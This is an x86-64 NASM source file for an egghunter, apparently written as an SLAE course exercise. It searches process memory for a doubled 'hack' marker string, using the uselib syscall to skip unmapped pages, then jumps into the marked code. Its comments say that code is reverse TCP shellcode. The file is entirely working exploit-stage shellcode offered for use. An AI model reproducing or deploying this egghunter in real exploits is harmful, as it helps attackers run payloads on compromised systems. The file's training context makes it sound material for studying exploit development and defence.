;---------------------------------
;
; egghunter.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE-744
;
; September 2, 2016
;
;---------------------------------



global _start

section .text


_start:

	; This is our egghuter
	; it needs to search for 
	; 2 consecutive instances
	; of our 'hack' string
	; and then jump into, and execute
	; our reverse TCP shellcode
	;
	; we'll try this out with the uselib syscall 86
	; and hope we can find and execute our shell
	; in the data section




	xor rdx, rdx			; initialize the registers

page_alignment:
	or dx, 0xfff			; helps set up for page size (0xfff = 4095)

incrementer:
	inc rdx				; increase edx by 1

hunter:
	lea rdi, [rdx + 8]		; put the address of edx plus 8 bytes into ebx for the syscall
	xor rax, rax			; clear out eax
	mov al, 0x56			; #define __NR_uselib       86 (0x56)	
	syscall				; call it
	cmp al, 0xf2			; compare the return value in eax
	jz page_alignment		; short jump to next page if ZF set
	mov rax, 0x656d72656b636168	; copy our comparison string into eax
	mov rdi, rdx			; mov our value in edx into edi
	scasq				; compare eax with dword at edi (in other words, check to see if we have 2 consecutive strings)
	jnz incrementer			; short jump if ZF not set (no match)
	scasq				; make the eax comparison again (match, compare again)
	jnz incrementer			; short jump if ZF not set (no match)
	jmp rdi				; we found a match! pwnage!!! 
